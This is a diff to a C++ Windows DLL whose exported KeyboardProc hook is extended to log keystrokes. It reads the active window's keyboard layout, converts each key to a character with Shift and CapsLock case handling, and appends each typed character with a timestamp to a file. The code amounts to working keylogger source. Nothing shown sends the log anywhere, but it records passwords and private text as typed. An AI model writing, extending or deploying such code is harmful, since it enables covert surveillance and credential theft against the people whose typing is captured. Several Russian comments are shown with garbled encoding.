@@ -22,25 +22,49 @@ extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
 	_In_ LPARAM lParam
 )
 {
-	if (lParam > 0x8000) {//keyDown?? (нужно проверить)
-		UINT uScanCode = MapVirtualKeyA(wParam, 0);
+	if(code < 0 ||
+		wParam == VK_CONTROL ||
+		wParam == VK_MENU || 
+		wParam == VK_CAPITAL || 
+		wParam == VK_SHIFT)
+		return CallNextHookEx(NULL, code, wParam, lParam);
 
-		BYTE KeyState[256];
-		WORD BufChar;
+	if (lParam & 1<<31) {// 31bit keyDown
 
-		GetKeyboardState(KeyState);
+		//активный поток
+		DWORD processId;
+		DWORD activeThread = GetWindowThreadProcessId(
+			GetForegroundWindow(), &processId);
 
-		ToAscii(wParam, uScanCode, KeyState, &BufChar, 0);
-		char  chOutput = char(BufChar);
+		//раскладка клавиатуры в активном потоке
+		auto kbLayout = GetKeyboardLayout(activeThread);
 
+
+		UINT uScanCode = MapVirtualKeyEx(wParam, 0, kbLayout);
+		BYTE keysState[256];
+		WORD keySymbol;
+		//состо€ние всех клавиш
+		GetKeyboardState(keysState);
+
+		//перевод vk_key или scan_code в символ с учетом раскладки (регистр не учитываетс€!)
+		ToAsciiEx(wParam, uScanCode, keysState, &keySymbol, 0, kbLayout);
+		char  charSymbol = char(keySymbol);
+
+		//провер€ем шифт и капслок (дл€ регистра)
+		if ((GetAsyncKeyState(VK_SHIFT) && !GetAsyncKeyState(VK_CAPITAL)) ||
+			(!GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_CAPITAL)))
+			charSymbol = toupper(charSymbol);
+
+		//получаем текущее врем€
 		auto start = std::chrono::system_clock::now();
 
 		std::time_t end_time = std::chrono::system_clock::to_time_t(start);
 		char timeBuff[50];
 		ctime_s(timeBuff, sizeof(timeBuff), &end_time);
 
+		//пишем в файл
 		std::ofstream ofs(statsPath, std::ofstream::out | std::ofstream::app);
-		ofs << "'" << chOutput << "'" << " : " << timeBuff;
+		ofs << "'" << charSymbol << "'" << " : " << timeBuff;
 		ofs.close();
 
 	}
